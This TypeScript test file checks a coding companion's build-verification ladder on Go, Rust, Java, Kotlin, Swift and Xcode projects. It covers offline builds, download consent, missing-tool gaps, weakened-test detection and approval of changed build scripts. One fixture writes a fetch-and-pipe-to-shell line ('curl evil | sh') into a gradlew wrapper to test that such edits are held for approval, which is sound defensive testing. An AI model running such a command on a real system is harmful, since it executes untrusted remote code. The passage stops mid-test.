// The proof ladder on Go, Rust, Java, Kotlin, Swift and Xcode projects. Exit codes decide. A build runs without downloading
// anything first; it runs the way that may download packages only when the install setting allows it (a question when the
// setting says ask, never when it says never, and never in Point at the problem or on earlier versions). A missing tool is
// a plain gap with the command to install it. Every command here is a stand in: nothing is installed, started or downloaded.
import { afterEach, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { CheckpointStore } from "../src/checkpoints.ts";
import { runLadder, type LadderOptions, type StepUpdate } from "../src/proof/ladder.ts";
import { detectProject } from "../src/proof/detect.ts";
import { DOWNLOAD_ASK, type NativeEnv } from "../src/proof/native.ts";
import { memoryApprovals } from "../src/proof/approvedruns.ts";
import { AgentRunner } from "../src/agent.ts";
import { ScriptedEngine } from "../src/engine.ts";
import { TaskLog } from "../src/tasklog.ts";
import type { Event } from "../../protocol/index.ts";
import type { RunResult } from "../src/proof/exec.ts";
import type { Running } from "../src/proof/server.ts";

const made: string[] = [];
afterEach(() => { while (made.length) rmSync(made.pop()!, { recursive: true, force: true }); });
const tmp = () => { const d = realpathSync(mkdtempSync(join(tmpdir(), "companion-natl-"))); made.push(d); return d; };
const put = (root: string, files: Record<string, string>) => { for (const [p, c] of Object.entries(files)) { mkdirSync(dirname(join(root, p)), { recursive: true }); writeFileSync(join(root, p), c); } };
const res = (o: Partial<RunResult> = {}): RunResult => ({ code: 0, signal: null, stdout: "", stderr: "", timedOut: false, ms: 1, ...o });
const failing = (stderr: string, code = 1) => res({ code, stderr });
const ALL: NativeEnv = { has: () => true, home: "/nonexistent-home" };
const lines = (n: number, at: Record<number, string> = {}) => Array.from({ length: n }, (_, i) => at[i + 1] ?? `// line ${i + 1}`).join("\n") + "\n";
const rungs = (r: { steps: { rung: string; status: string }[] }) => r.steps.map((s) => `${s.rung}:${s.status}`);

const GO_MOD = "module example.com/shop\n\ngo 1.22\n\nrequire github.com/google/uuid v1.6.0\n";
const GO = { "go.mod": GO_MOD, "main.go": "package main\n\nfunc main() {}\n", "main_test.go": "package main\n\nimport \"testing\"\n\nfunc TestMain(t *testing.T) {}\n" };
const NEEDS_NET = "go: github.com/google/uuid@v1.6.0: module lookup disabled by GOPROXY=off\n";
const POM = '<project><modelVersion>4.0.0</modelVersion><groupId>com.shop</groupId><artifactId>shop</artifactId><version>1.0</version></project>\n';

async function check(files: Record<string, string>, o: Omit<Partial<LadderOptions>, "run"> & { env?: NativeEnv; run?: (c: string) => RunResult | Promise<RunResult>; after?: Record<string, string> } = {}) {
  const dir = tmp();
  put(dir, files);
  const store = new CheckpointStore(tmp(), dir);
  const b = await store.snapshot("before");
  if (o.after) put(dir, o.after);
  const a = o.after ? await store.snapshot("after") : b;
  const calls: { command: string; timeoutMs: number; env?: Record<string, string> }[] = [], updates: StepUpdate[] = [], asks: string[] = [], started: string[] = [];
  const { env, run, after, ...rest } = o;
  void after;
  const result = await runLadder({
    project: dir, store, beforeId: b.id, afterId: a.id, noRoomWaitsMs: [], onStep: (u) => updates.push(u),
    detect: (d) => detectProject(d, undefined, undefined, env ?? ALL),
    run: (async (command: string, x: { timeoutMs: number; env?: Record<string, string> }) => { calls.push({ command, timeoutMs: x.timeoutMs, env: x.env }); return run ? run(command) : res(); }) as never,
    server: async (start: { kind: string; command?: string }, so: { cwd: string }) => { started.push(`${start.command ?? start.kind}`); void so; return { ok: true, url: "http://127.0.0.1:9/", port: 9, stop: async () => {} } as Running; },
    browser: async (url: string) => ({ ok: true, problems: [], consoleErrors: [], failedRequests: [], visited: [url], ms: 1 }) as never,
    askInstall: async (c: string) => { asks.push(c); return false; },
    limits: { checkMs: 111_000, testMs: 222_000, startMs: 5000, browserMs: 5000 },
    ...rest,
  });
  return { result, calls, asks, updates, started, dir, commands: calls.map((c) => c.command) };
}

describe("a healthy project of each kind, checked without downloading anything", () => {
  test("Go: build, vet and test run the offline way, with the install step saying plainly that a build may download", async () => {
    const { result, commands } = await check(GO);
    expect(rungs(result)).toEqual(["install:skipped", "checks:passed", "tests:passed", "start:skipped", "browser:skipped"]);
    expect(result.verdict).toBe("passed");
    expect(commands).toEqual([
      "GOTOOLCHAIN=local GOPROXY=off go build -buildvcs=false ./...",
      "GOTOOLCHAIN=local GOPROXY=off go vet ./...",
      "GOTOOLCHAIN=local GOPROXY=off go test ./...",
    ]);
    expect(result.steps[0].detail).toMatch(/may download the packages the project needs from the internet/);
    expect(result.steps[1].detail).toBe("build, lint passed.");
  });
  test("each check gets the time limit of its rung (the check time setting scales them)", async () => {
    const { calls } = await check(GO);
    expect(calls.map((c) => c.timeoutMs)).toEqual([111_000, 111_000, 222_000]);
  });
  test("Rust, Maven, Gradle, Swift and Xcode projects each run their own commands", async () => {
    const rust = await check({ "Cargo.toml": '[package]\nname = "x"\nversion = "0.1.0"\n', "src/lib.rs": "#[test]\nfn a() {}\n" });
    expect(rust.commands).toEqual(["RUSTUP_AUTO_INSTALL=0 cargo check --workspace --all-targets --color never --offline", "RUSTUP_AUTO_INSTALL=0 cargo clippy --workspace --all-targets --color never --offline", "RUSTUP_AUTO_INSTALL=0 cargo test --workspace --color never --offline"]);
    const mvn = await check({ "pom.xml": POM, "src/test/java/AppTest.java": "class AppTest {}" });
    expect(mvn.commands).toEqual(["mvn -B -q -o compile", "mvn -B -q -o test"]);
    const gradle = await check({ "build.gradle": "plugins { id 'java' }\n" });
    expect(gradle.commands).toHaveLength(1);
    expect(gradle.commands[0]).toMatch(/^gradle build -x test -q --offline /);
    const swift = await check({ "Package.swift": "// swift-tools-version:5.9\n", "Tests/xTests/A.swift": "import XCTest\n" });
    expect(swift.commands).toEqual(["swift build --disable-automatic-resolution", "swift test --disable-automatic-resolution"]);
    for (const r of [rust, mvn, gradle, swift]) expect(r.result.verdict).toBe("passed");
  });
});

describe("downloads follow the install setting", () => {
  // Only the first offline try needs the internet; once the online command has run, the packages are there.
  const needsOnce = (c: string) => (c.includes("GOPROXY=off") && c.includes("go build") ? failing(NEEDS_NET) : res());
  test("automatic: the offline try says it needs packages, so the command that may download runs, and the rest after it", async () => {
    const { result, commands, asks } = await check(GO, { run: needsOnce });
    expect(commands).toEqual([
      "GOTOOLCHAIN=local GOPROXY=off go build -buildvcs=false ./...",
      "GOTOOLCHAIN=local go build -buildvcs=false ./...",
      "GOTOOLCHAIN=local go vet ./...",
      "GOTOOLCHAIN=local go test ./...",
    ]);
    expect(asks).toEqual([]);
    expect(result.verdict).toBe("passed");
  });
  test("a build that needs nothing is never run the other way", async () => {
    const { commands } = await check(GO);
    expect(commands.some((c) => !c.includes("GOPROXY=off"))).toBe(false);
  });
  test("ask: one question, in plain words, only when the offline try needs a download; a yes downloads", async () => {
    const seen: string[] = [];
    const { result, commands } = await check(GO, { check: { install: "ask" } as never, run: needsOnce, askInstall: async (c) => { seen.push(c); return true; } });
    expect(seen).toHaveLength(1);
    expect(seen[0].startsWith(DOWNLOAD_ASK)).toBe(true);
    expect(seen[0]).toContain("go build");
    expect(commands.filter((c) => !c.includes("GOPROXY=off"))).toHaveLength(3);
    expect(result.verdict).toBe("passed");
  });
  test("ask, and the answer is no: nothing is downloaded, each step that needed it is a gap with the command to run, and nothing is called checked", async () => {
    const { result, commands, asks } = await check(GO, { check: { install: "ask" } as never, run: (c) => failing(NEEDS_NET + c) });
    expect(asks).toHaveLength(1);   // asked once, not once per step
    expect(commands.every((c) => c.includes("GOPROXY=off"))).toBe(true);
    expect(result.verdict).toBe("nothing_to_check");
    expect(result.gaps?.[0]).toMatch(/not on this Mac yet/);
    expect(result.gaps?.[0]).toMatch(/you said no, or did not answer/);
    expect(result.gaps?.[0]).toContain("go mod download");
    expect(rungs(result)).toEqual(["install:skipped", "checks:skipped", "tests:skipped", "start:skipped", "browser:skipped"]);
  });
  test("never: no question and no download; the gap says Settings", async () => {
    const { result, commands, asks } = await check(GO, { check: { install: "never" } as never, run: (c) => failing(NEEDS_NET + c) });
    expect(asks).toEqual([]);
    expect(commands.every((c) => c.includes("GOPROXY=off"))).toBe(true);
    expect(result.gaps?.[0]).toMatch(/Settings says never/);
  });
  test("the house rule 'ask before installing packages' makes automatic ask", async () => {
    const r = await check({ ...GO, ".companion/rules.txt": "ask before installing packages\n" }, { run: (c) => (c.includes("GOPROXY=off") ? failing(NEEDS_NET) : res()) });
    expect(r.asks).toHaveLength(1);
  });
  test("Point at the problem (noInstall) never downloads and never asks, and says what to run", async () => {
    const { result, commands, asks } = await check(GO, { noInstall: true, run: (c) => failing(NEEDS_NET + c) });
    expect(asks).toEqual([]);
    expect(commands.every((c) => c.includes("GOPROXY=off"))).toBe(true);
    expect(result.verdict).toBe("failed");
    expect(result.failedAt?.rung).toBe("install");
    expect(result.failedAt?.detail).toMatch(/go mod download/);
    expect(result.failedAt?.problem).toBeUndefined();
  });
  test("when some checks could run, the packages that are missing leave the result at passed with gaps", async () => {
    const { result } = await check(GO, { noInstall: true, run: (c) => (c.includes("go test") ? failing(NEEDS_NET) : res()) });
    expect(result.verdict).toBe("passed_with_gaps");
    expect(result.gaps?.[0]).toMatch(/go mod download/);
    expect(result.unclear).toEqual([{ rung: "tests", missing: true }]);
  });
  test("a failure that is the code's own is never retried the other way", async () => {
    const { commands, result } = await check(GO, { run: (c) => failing("# example.com/shop\n./main.go:3:6: undefined: x\n" + c) });
    expect(commands).toEqual(["GOTOOLCHAIN=local GOPROXY=off go build -buildvcs=false ./..."]);
    expect(result.verdict).toBe("failed");
  });
  test("online and the internet is not there: a gap, never the project's fault", async () => {
    const { result } = await check(GO, { run: (c) => (c.includes("GOPROXY=off") ? failing(NEEDS_NET) : failing('go: github.com/google/uuid@v1.6.0: Get "https://proxy.golang.org/x": dial tcp: lookup proxy.golang.org: no such host')) });
    expect(result.verdict).not.toBe("failed");
    expect(result.gaps?.[0]).toMatch(/could not reach the internet/);
  });
  test("a wrapper whose build tool is not on this Mac would download it first: it is not run offline at all", async () => {
    const files = { "pom.xml": POM, mvnw: "#!/bin/sh\n", ".mvn/wrapper/maven-wrapper.properties": "distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/3.9.6/apache-maven-3.9.6-bin.zip\n" };
    const env: NativeEnv = { has: (t) => t === "java", home: tmp() };
    const no = await check(files, { env, check: { install: "ask" } as never });
    expect(no.commands).toEqual([]);
    expect(no.asks).toHaveLength(1);
    expect(no.result.gaps?.[0]).toMatch(/not on this Mac yet/);
    expect(no.result.verdict).toBe("nothing_to_check");
    const yes = await check(files, { env });
    expect(yes.commands).toEqual(["sh ./mvnw -B -q compile"]);
    expect(yes.result.verdict).toBe("passed");
    const never = await check(files, { env, check: { install: "never" } as never });
    expect(never.commands).toEqual([]);
  });
});

describe("a tool that is not on this Mac", () => {
  test("a plain gap with the command to install it; nothing runs; nothing is called checked", async () => {
    const { result, commands } = await check(GO, { env: { has: () => false, home: "/nonexistent-home" } });
    expect(commands).toEqual([]);
    expect(result.verdict).toBe("nothing_to_check");
    expect(result.gaps?.[0]).toMatch(/Go is not installed on this Mac/);
    expect(result.gaps?.[0]).toContain("brew install go");
    expect(result.steps[0].detail).toContain("brew install go");
    expect(result.steps[1].detail).toContain("brew install go");
  });
  test("Point at the problem says it as the finding", async () => {
    const { result } = await check(GO, { env: { has: () => false, home: "/nonexistent-home" }, noInstall: true });
    expect(result.verdict).toBe("failed");
    expect(result.failedAt?.rung).toBe("install");
    expect(result.failedAt?.detail).toContain("brew install go");
  });
  test("a tool the shim says is missing while running (Java on a Mac with no JDK) is a gap, not the code's failure", async () => {
    const { result } = await check({ "pom.xml": POM }, { run: () => failing("The operation couldn’t be completed. Unable to locate a Java Runtime.\nPlease visit http://www.java.com for information on installing Java.") });
    expect(result.verdict).not.toBe("failed");
    expect(result.gaps?.[0]).toMatch(/Java is not installed/);
    expect(result.gaps?.[0]).toContain("brew install --cask temurin");
  });
  test("Swift tests without Xcode (no XCTest) are a gap; the build still counts", async () => {
    const out = "error: /x/Tests/xTests/A.swift:1:8 unable to resolve module dependency: 'XCTest'\nerror: Build failed\n";
    const { result } = await check({ "Package.swift": "// swift-tools-version:5.9\n", "Tests/xTests/A.swift": "import XCTest\n" }, { run: (c) => (c.startsWith("swift test") ? failing(out) : res()) });
    expect(result.verdict).toBe("passed_with_gaps");
    expect(result.gaps?.[0]).toMatch(/XCTest/);
    expect(result.gaps?.[0]).toContain("Xcode");
  });
  test("Xcode's license not accepted is a gap that names the command", async () => {
    const { result } = await check({ "Package.swift": "" }, { run: () => failing("Agreeing to the Xcode/iOS license requires admin privileges, please run “sudo xcodebuild -license” and then retry this command.\nYou have not agreed to the Xcode license agreements.") });
    expect(result.gaps?.[0]).toContain("sudo xcodebuild -license");
  });
  test("a Rust toolchain the project names but this Mac lacks is a gap with rustup's command", async () => {
    const { result } = await check({ "Cargo.toml": '[package]\nname = "x"\n' }, { run: () => failing("error: toolchain '1.70.0-aarch64-apple-darwin' is not installed") });
    expect(result.gaps?.[0]).toContain("rustup toolchain install 1.70.0-aarch64-apple-darwin");
  });
  test("a Go that is older than the project's go.mod asks is a gap, and no other Go is ever downloaded", async () => {
    const { result, commands } = await check(GO, { run: () => failing("go: go.mod requires go >= 1.24.0 (running go 1.22.1; GOTOOLCHAIN=local)") });
    expect(result.gaps?.[0]).toMatch(/Go 1\.24\.0 or newer/);
    expect(commands.every((c) => c.startsWith("GOTOOLCHAIN=local "))).toBe(true);
  });
});

describe("a real failure", () => {
  test("a compile error is the project's failure, with the place in the file ringed and no other way tried", async () => {
    const files = { ...GO, "main.go": lines(10, { 7: "\tx := totl(1, 2)" }) };
    const { result, commands } = await check(files, { run: () => failing("# example.com/shop\n./main.go:7:7: undefined: totl\n") });
    expect(result.verdict).toBe("failed");
    expect(result.failedAt?.rung).toBe("checks");
    expect(result.failedAt?.detail).toMatch(/^build failed\./);
    expect(result.failedAt?.problem).toMatchObject({ kind: "line", file: "main.go", line: 7, message: "undefined: totl" });
    expect(commands).toHaveLength(1);
    expect(result.checks).toEqual([{ name: "build", status: "failed" }]);
  });
  test("a failing test is a failure with its place", async () => {
    const files = { ...GO, "main_test.go": lines(12, { 9: '\tt.Errorf("Add(2, 2) = %d; want 4", got)' }) };
    const { result } = await check(files, { run: (c) => (c.includes("go test") ? failing("--- FAIL: TestAdd (0.00s)\n    main_test.go:9: Add(2, 2) = 5; want 4\nFAIL\n") : res()) });
    expect(result.verdict).toBe("failed");
    expect(result.failedAt?.rung).toBe("tests");
    expect(result.failedAt?.problem).toMatchObject({ kind: "line", file: "main_test.go", line: 9 });
  });
  test("the words of a failure leave out the tools' noise (progress counters, the long command line, Gradle's advice)", async () => {
    const noise = "[19 / 24]\n/x/Sources/a/main.swift:5:23: error: cannot convert value of type 'String' to expected argument type 'Int'\nFailed frontend command:\n/Library/Developer/CommandLineTools/usr/bin/swift-frontend " + "-x ".repeat(400) + "\nerror: Build failed\n";
    const { result } = await check({ "Package.swift": "// swift-tools-version:5.9\n" }, { run: () => failing(noise) });
    expect(result.failedAt?.detail).toContain("cannot convert value of type 'String'");
    expect(result.failedAt?.detail).not.toContain("swift-frontend");
    expect(result.failedAt?.detail).not.toContain("[19 / 24]");
    const xc = "--- xcodebuild: WARNING: Using the first of multiple matching destinations:\n{ platform:macOS, arch:arm64, id:0000, name:My Mac }\nerror: the following command failed with exit code 1 but produced no further output\nSwiftCompile normal arm64 (in target 'Shop' from project 'Shop')\n/x/Shop/main.swift:5:23: error: cannot convert value of type 'String' to expected argument type 'Int'\nnote: Using codesigning identity override: \n** BUILD FAILED **\n";
    const x = await check({ "Package.swift": "// swift-tools-version:5.9\n" }, { run: () => failing(xc) });
    expect(x.result.failedAt?.detail).toContain("cannot convert value of type 'String'");
    for (const noisy of ["WARNING", "platform:macOS", "no further output", "SwiftCompile", "codesigning", "BUILD FAILED"]) expect(x.result.failedAt?.detail, noisy).not.toContain(noisy);
    const g = await check({ "build.gradle": "" }, { run: () => failing("e: file:///x/App.kt:4:13 Unresolved reference: totl\n\nFAILURE: Build failed with an exception.\n\n* Try:\n> Run with --stacktrace option to get the stack trace.\n> Run with --info or --debug option to get more log output.\n\nBUILD FAILED in 2s\n") });
    expect(g.result.failedAt?.detail).toContain("Unresolved reference: totl");
    expect(g.result.failedAt?.detail).not.toContain("Run with --stacktrace");
    expect(g.result.failedAt?.detail).not.toContain("BUILD FAILED");
  });
  test("a time out is a failure with the limit said", async () => {
    const { result } = await check(GO, { run: () => res({ code: null, timedOut: true }) });
    expect(result.verdict).toBe("failed");
    expect(result.failedAt?.detail).toMatch(/took too long \(over 111 seconds\)/);
  });
  test("Stop ends it as cancelled, never as a failure", async () => {
    const ac = new AbortController();
    const { result } = await check(GO, { signal: ac.signal, run: () => { ac.abort(); return res({ code: null, aborted: true }); } });
    expect(result.verdict).toBe("cancelled");
  });
});

describe("tests that were weakened are caught for these languages too", () => {
  async function weakened(before: Record<string, string>, after: Record<string, string>) {
    const r = await check({ ...before }, { after });
    return r.result;
  }
  test("Go: a test removed", async () => {
    const r = await weakened({ "go.mod": GO_MOD, "a_test.go": "package a\nfunc TestA(t *testing.T) {}\nfunc TestB(t *testing.T) {}\n" }, { "a_test.go": "package a\nfunc TestA(t *testing.T) {}\n" });
    expect(r.verdict).toBe("failed");
    expect(r.failedAt?.detail).toMatch(/fewer tests/);
  });
  test("Rust: a #[test] removed, and a #[ignore] added", async () => {
    const base = { "Cargo.toml": '[package]\nname = "x"\n', "src/lib.rs": "#[test]\nfn a() {}\n#[test]\nfn b() {}\n" };
    expect((await weakened(base, { "src/lib.rs": "#[test]\nfn a() {}\n" })).failedAt?.detail).toMatch(/fewer tests/);
    expect((await weakened(base, { "src/lib.rs": "#[test]\n#[ignore]\nfn a() {}\n#[test]\nfn b() {}\n" })).failedAt?.detail).toMatch(/switched off/);
  });
  test("Java and Kotlin: a @Test removed, and a @Disabled added", async () => {
    const base = { "pom.xml": POM, "src/test/java/AppTest.java": "class AppTest {\n @Test void a() {}\n @Test void b() {}\n}\n" };
    expect((await weakened(base, { "src/test/java/AppTest.java": "class AppTest {\n @Test void a() {}\n}\n" })).failedAt?.detail).toMatch(/fewer tests/);
    expect((await weakened(base, { "src/test/java/AppTest.java": "class AppTest {\n @Test @Disabled void a() {}\n @Test void b() {}\n}\n" })).failedAt?.detail).toMatch(/switched off/);
    const kt = { "build.gradle.kts": "", "src/test/kotlin/AppTest.kt": "class AppTest {\n @Test fun a() {}\n @Test fun b() {}\n}\n" };
    expect((await weakened(kt, { "src/test/kotlin/AppTest.kt": "class AppTest {\n @Test fun a() {}\n}\n" })).failedAt?.detail).toMatch(/fewer tests/);
  });
  test("Swift: an XCTest function removed, and a Swift Testing @Test", async () => {
    const base = { "Package.swift": "", "Tests/xTests/A.swift": "final class A: XCTestCase {\n func testA() {}\n func testB() {}\n}\n" };
    expect((await weakened(base, { "Tests/xTests/A.swift": "final class A: XCTestCase {\n func testA() {}\n}\n" })).failedAt?.detail).toMatch(/fewer tests/);
    const st = { "Package.swift": "", "Tests/xTests/B.swift": "@Test func a() {}\n@Test func b() {}\n" };
    expect((await weakened(st, { "Tests/xTests/B.swift": "@Test func a() {}\n" })).failedAt?.detail).toMatch(/fewer tests/);
  });
  test("a commented out test is not a test", async () => {
    const base = { "Cargo.toml": '[package]\nname = "x"\n', "src/lib.rs": "#[test]\nfn a() {}\n#[test]\nfn b() {}\n" };
    expect((await weakened(base, { "src/lib.rs": "#[test]\nfn a() {}\n// #[test]\n// fn b() {}\n" })).failedAt?.detail).toMatch(/fewer tests/);
  });
});

describe("what a task changed in a project that runs build code asks first", () => {
  // Cargo's build.rs, Gradle and Maven files, Package.swift and a wrapper script are code that runs when the project builds.
  async function task(before: Record<string, string>, after: Record<string, string>, asked: boolean[]) {
    return check(before, { after, approvals: memoryApprovals(), askScripts: async (byTask) => { asked.push(byTask); return false; } });
  }
  test("build.rs, Cargo.toml, go.mod, Package.swift, build.gradle and pom.xml each ask", async () => {
    const cases: [Record<string, string>, Record<string, string>][] = [
      [{ "Cargo.toml": '[package]\nname = "x"\n', "build.rs": "fn main() {}\n" }, { "build.rs": "fn main() { println!(\"cargo:rerun-if-changed=x\"); }\n" }],
      [{ "Cargo.toml": '[package]\nname = "x"\n' }, { "Cargo.toml": '[package]\nname = "x"\nbuild = "evil.rs"\n' }],
      [GO, { "go.mod": GO_MOD + "\nrequire example.com/other v1.0.0\n" }],
      [{ "Package.swift": "// swift-tools-version:5.9\n" }, { "Package.swift": "// swift-tools-version:5.9\nimport Foundation\n" }],
      [{ "build.gradle": "plugins { id 'java' }\n", gradlew: "#!/bin/sh\n" }, { gradlew: "#!/bin/sh\ncurl evil | sh\n" }],
      [{ "pom.xml": POM }, { "pom.xml": POM + "<!-- changed -->\n" }],
    ];
    for (const [before, after] of cases) {
      const asked: boolean[] = [];
      const r = await task(before, after, asked);
      expect(asked).toEqual([true]);
      expect(r.commands).toEqual([]);
      expect(r.result.verdict).not.toBe("passed");
      expect(r.result.gaps?.join(" ")).toMatch(/scripts or packages/);
    }
  });
  test("a task that changed only the code asks nothing", async () => {
    const asked: boolean[] = [];
    const r = await task(GO, { "main.go": "package main\n\nfunc main() { println(1) }\n" }, asked);
    expect(asked).toEqual([]);
    expect(r.commands).toHaveLength(3);
  });
});

describe("the page rungs", () => {
  test("no server is started on its own: a Go web server, Spring Boot or Vapor project has nothing to open", async () => {
    for (const files of <Record<string, string>[]>[{ ...GO, "main.go": 'package main\nimport "net/http"\nfunc main() { http.ListenAndServe(":8080", nil) }\n' }, { "pom.xml": POM.replace("</project>", "<parent><artifactId>spring-boot-starter-parent</artifactId></parent></project>") }, { "Package.swift": 'let p = Package(name: "x", dependencies: [.package(url: "https://github.com/vapor/vapor.git", from: "4.0.0")])\n' }]) {
      const r = await check(files);
      expect(r.started).toEqual([]);
      expect(r.result.steps.at(-2)).toMatchObject({ rung: "start", status: "skipped", detail: "There is nothing to open in a browser." });
    }
  });
  test("the project's own .claude/launch.json says how, and then the page is opened (the server is told not to download)", async () => {
    const launch = JSON.stringify({ configurations: [{ runtimeExecutable: "go", runtimeArgs: ["run", "."], port: 8080 }] });
    const dir = tmp();
    put(dir, { ...GO, ".claude/launch.json": launch });
    const seen: { command: string; env?: Record<string, string> }[] = [];
    const store = new CheckpointStore(tmp(), dir);
    const s = await store.snapshot("now");
    const result = await runLadder({
      project: dir, store, beforeId: s.id, afterId: s.id, detect: (d) => detectProject(d, undefined, undefined, ALL), noRoomWaitsMs: [],
      run: (async () => res()) as never,
      server: (async (start: { command: string; env?: Record<string, string> }) => { seen.push({ command: start.command, env: start.env }); return { ok: true, url: "http://127.0.0.1:9/", port: 9, stop: async () => {} }; }) as never,
      browser: (async (url: string) => ({ ok: true, problems: [], consoleErrors: [], failedRequests: [], visited: [url], ms: 1 })) as never,
      limits: { startMs: 5000, browserMs: 5000 },
    });
    expect(seen.map((x) => x.command)).toEqual(["go run ."]);
    expect(seen[0].env).toMatchObject({ GOPROXY: "off", GOTOOLCHAIN: "local", CARGO_NET_OFFLINE: "true", MAVEN_ARGS: "-o", RUSTUP_AUTO_INSTALL: "0" });
    expect(result.verdict).toBe("passed");
    expect(rungs(result).slice(-2)).toEqual(["start:passed", "browser:passed"]);
  });
  test("with downloads allowed, the server may fetch what it needs but still never a toolchain", async () => {
    const launch = JSON.stringify({ configurations: [{ runtimeExecutable: "go", runtimeArgs: ["run", "."] }] });
    const seen: { env?: Record<string, string> }[] = [];
    await check({ ...GO, ".claude/launch.json": launch }, { run: (c) => (c.includes("GOPROXY=off") ? failing(NEEDS_NET) : res()), server: (async (start: { env?: Record<string, string> }) => { seen.push({ env: start.env }); return { ok: true, url: "http://127.0.0.1:9/", port: 9, stop: async () => {} }; }) as never });
    expect(seen[0].env?.GOPROXY).toBeUndefined();
    expect(seen[0].env).toMatchObject({ GOTOOLCHAIN: "local", RUSTUP_AUTO_INSTALL: "0" });
  });
  test("a server that cannot start for want of packages it may not fetch is a gap, not a failure", async () => {
    const launch = JSON.stringify({ configurations: [{ runtimeExecutable: "go", runtimeArgs: ["run", "."] }] });
    const server = (async (start: { env?: Record<string, string> }) => (start.env?.GOPROXY === "off" ? { ok: false, reason: "The server stopped on its own (exit code 1).", output: NEEDS_NET } : { ok: true, url: "http://127.0.0.1:9/", port: 9, stop: async () => {} })) as never;
    const never = await check({ ...GO, ".claude/launch.json": launch }, { check: { install: "never" } as never, server });
    expect(never.result.verdict).not.toBe("failed");
    expect(never.result.gaps?.join(" ")).toMatch(/go mod download/);
    // Allowed: the same server is started again the other way, and the page is opened.
    const auto = await check({ ...GO, ".claude/launch.json": launch }, { server });
    expect(auto.result.verdict).toBe("passed");
  });
});

describe("the earlier version for the picture", () => {
  test("is started the offline way: an earlier version never downloads a package", async () => {
    const { captureBefore } = await import("../src/proof/before.ts");
    const launch = JSON.stringify({ configurations: [{ runtimeExecutable: "go", runtimeArgs: ["run", "."] }] });
    const dir = tmp();
    put(dir, { ...GO, ".claude/launch.json": launch });
    const store = new CheckpointStore(tmp(), dir);
    const s = await store.snapshot("now");
    const seen: { env?: Record<string, string> }[] = [];
    const b = await captureBefore({ store, beforeId: s.id, project: dir, workDir: tmp(), server: (async (start: { env?: Record<string, string> }) => { seen.push({ env: start.env }); return { ok: false, reason: "The server stopped on its own (exit code 1).", output: "" }; }) as never });
    expect(b).toEqual({ none: "crashed" });
    expect(seen[0].env).toMatchObject({ GOPROXY: "off", GOTOOLCHAIN: "local", CARGO_NET_OFFLINE: "true", MAVEN_ARGS: "-o", RUSTUP_AUTO_INSTALL: "0" });
  });
  test("a package it may not fetch is 'not pictured', never 'it crashed'", async () => {
    const { captureBefore } = await import("../src/proof/before.ts");
    const launch = JSON.stringify({ configurations: [{ runtimeExecutable: "go", runtimeArgs: ["run", "."] }] });
    const dir = tmp();
    put(dir, { ...GO, ".claude/launch.json": launch });
    const store = new CheckpointStore(tmp(), dir);
    const s = await store.snapshot("now");
    const b = await captureBefore({ store, beforeId: s.id, project: dir, workDir: tmp(), server: (async () => ({ ok: false, reason: "The server stopped on its own (exit code 1). " + NEEDS_NET, output: NEEDS_NET })) as never });
    expect(b).toEqual({ none: "not_pictured" });
  });
});

// Point at the problem on such a project: the press of the key, no Claude, nothing installed or downloaded, and the finding the
// character points at.
describe("Point at the problem on a Go, Rust, Java, Kotlin or Swift project", () => {
  async function pointAt(files: Record<string, string>, run: (c: string) => RunResult, env: NativeEnv = ALL) {
    const project = tmp();
    put(project, files);
    const events: Event[] = [];
    const commands: string[] = [];
    const runner = new AgentRunner({
      shadowRoot: tmp(), engine: new ScriptedEngine([]), log: new TaskLog(":memory:"), emit: (e) => events.push(e),
      proof: async (c) => runLadder({ project: c.project, store: c.store, beforeId: c.beforeId, afterId: c.afterId, onStep: c.onStep, signal: c.signal, noInstall: c.noInstall, check: c.check, limits: c.limits, approvals: c.approvals, noRoomWaitsMs: [], detect: (d) => detectProject(d, undefined, undefined, env), run: (async (command: string) => { commands.push(command); return run(command); }) as never }),
    });
    await runner.handle({ v: 1, id: "f1", type: "problem.find", project, agent: "a1" });
    return { found: events.filter((e) => e.type === "problem.found") as any[], commands, events };
  }
  test("a compile error is pointed at, in the compiler's words, with only offline commands run", async () => {
    const { found, commands } = await pointAt({ ...GO, "main.go": lines(10, { 7: "\tx := totl(1, 2)" }) }, () => failing("# example.com/shop\n./main.go:7:7: undefined: totl\n"));
    expect(found).toHaveLength(1);
    expect(found[0]).toMatchObject({ verdict: "failed", label: "Building and checking the code", problem: { kind: "line", file: "main.go", line: 7, message: "undefined: totl" } });
    expect(commands.every((c) => c.includes("GOPROXY=off"))).toBe(true);
  });
  test("packages that are not on this Mac yet are said with the command to run, not as a broken project", async () => {
    const { found, commands } = await pointAt(GO, (c) => failing(NEEDS_NET + c));
    expect(found[0]).toMatchObject({ verdict: "failed", label: "Installing what the project needs" });
    expect(found[0].detail).toContain("go mod download");
    expect(found[0].problem).toBeUndefined();
    expect(commands.every((c) => c.includes("GOPROXY=off"))).toBe(true);
  });
  test("a tool that is not installed is said with the command to install it", async () => {
    const { found, commands } = await pointAt({ "Cargo.toml": '[package]\nname = "x"\n' }, () => res(), { has: () => false, home: "/nonexistent-home" });
    expect(commands).toEqual([]);
    expect(found[0]).toMatchObject({ verdict: "failed", label: "Installing what the project needs" });
    expect(found[0].detail).toContain("sh.rustup.rs");
  });
  test("a healthy project says so", async () => {
    const { found } = await pointAt(GO, () => res());
    expect(found[0]).toMatchObject({ verdict: "passed" });
  });
});

describe("a project that cannot be built here", () => {
  test("an Android project is said plainly, nothing is run", async () => {
    const r = await check({ "build.gradle": "plugins { id 'com.android.application' }\n" });
    expect(r.commands).toEqual([]);
    expect(r.result.verdict).toBe("nothing_to_check");
    expect(r.result.gaps?.join(" ")).toMatch(/Android/);
  });
});

// ---- review round: what a yes covers, tests that ran nothing, and servers that would download

describe("a yes to running the changed scripts is not a yes to downloading packages", () => {
  test("ask: the scripts card is answered yes, the download card is answered no, so the online command never runs", async () => {
    const asked: boolean[] = [];
    const r = await check(GO, {
      after: { "go.mod": GO_MOD + "\nrequire example.com/other v1.0.0\n" }, approvals: memoryApprovals(), check: { install: "ask" } as never,
      askScripts: async (byTask) => { asked.push(byTask); return true; }, run: (c) => (c.includes("GOPROXY=off") ? failing(NEEDS_NET) : res()),
    });
    expect(asked).toEqual([true]);
    expect(r.asks).toHaveLength(1);
    expect(r.asks[0].startsWith(DOWNLOAD_ASK)).toBe(true);
    expect(r.commands.length).toBeGreaterThan(0);
    expect(r.commands.every((c) => c.includes("GOPROXY=off"))).toBe(true);
    expect(r.result.verdict).not.toBe("passed");
  });
  test("ask: a yes to both downloads", async () => {
